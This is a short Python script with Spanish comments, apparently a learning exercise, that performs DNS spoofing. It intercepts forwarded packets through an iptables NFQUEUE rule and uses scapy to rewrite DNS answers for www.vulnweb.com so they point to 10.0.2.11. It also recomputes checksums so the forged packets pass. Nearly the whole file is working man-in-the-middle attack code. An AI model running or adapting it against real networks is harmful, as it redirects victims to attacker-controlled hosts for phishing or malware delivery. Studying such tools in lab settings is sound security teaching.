#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# Pirmer paso crear la cola para añadir los paquetes a la misma con el comando
# iptables -> programa que esta instalado en computadoras unix que permite modificar
# rutas en la computadora, asi como reglas de la misma.
# FORWARD es el lugar donde se almacenan los paquetes por default no locales.
# Los paquetes locales se guardan en OUTPUT e INPUT  por lo tanto se tiene que usar el
# comando dos veces, uno para input  y otro para output (responses packet, send packet)
# Elegimos NFQUEUE  con -j y especificamos el numero de la cola a usar

# iptables -I FORWARD -j NFQUEUE --queue-num 0

# apt-get install build-essential python-dev libnetfilter-queue-dev
# pip3 install netfilerqueue

def process_packet(packet):
    # si imprimimos lo del metodo get_payload muestra mas info parecida a usar scapy
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.vulnweb.com" in str(qname):
            print("[+] Spoofing target")
            # print(scapy_packet.show())

            # Modificamos los valores primero el response y asignamos el qname que se obtuvo es decir
            # la pagina que suplantaremos.
            # Y modificalos el campo rdata a la nueva ip que designaremos en el dns
            # Modifica el paquete para ver cada campo y como modificarlo se puede ver en el show
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.11")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            # Los valores de cheksum se aseguran que no hayan sido modificados los paquetes
            # Si son removidos scapy automaticamente genera esos paquetes :)
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            # Convertimos el packete scapy a un str y eso se lo damos al packet
            packet.set_payload(bytes(scapy_packet))
    # sino se aceptan no pasaran de la cola si estan siendo interceptados
    # se puede hacer un drop y le denegaremos el acceso a internet
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
# Metodo para conectar a la queue creada por eso se le manda el 0, el segundo arguento
# es una llamada a una funcion esta funcion se ejecutara en cada packete
queue.bind(0, process_packet)
queue.run()
# al final es importante la tabla de ip con el comando :  iptables --flush